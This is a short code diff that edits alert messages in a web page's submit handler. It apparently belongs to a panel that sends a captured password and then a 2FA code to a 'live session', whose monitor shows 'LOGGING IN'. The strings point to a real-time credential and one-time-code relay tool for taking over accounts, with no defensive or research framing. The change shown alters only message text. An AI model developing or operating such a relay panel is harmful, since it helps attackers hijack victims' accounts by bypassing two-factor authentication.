@@ -247,10 +247,10 @@
                 console.log('Submit response:', data);
                 
                 if (pass && !code) {
-                    alert('Password sent! Check the live feed — if 2FA appears, enter the code below.');
+                    alert('Password sent! Watch the live monitor — it should now show "LOGGING IN" (orange).');
                     document.getElementById('pass').value = '';
                 } else if (code) {
-                    alert('2FA code sent to live session!');
+                    alert('2FA code sent! Live monitor should update.');
                     document.getElementById('code').value = '';
                 } else {
                     alert(data.message || 'Submitted');
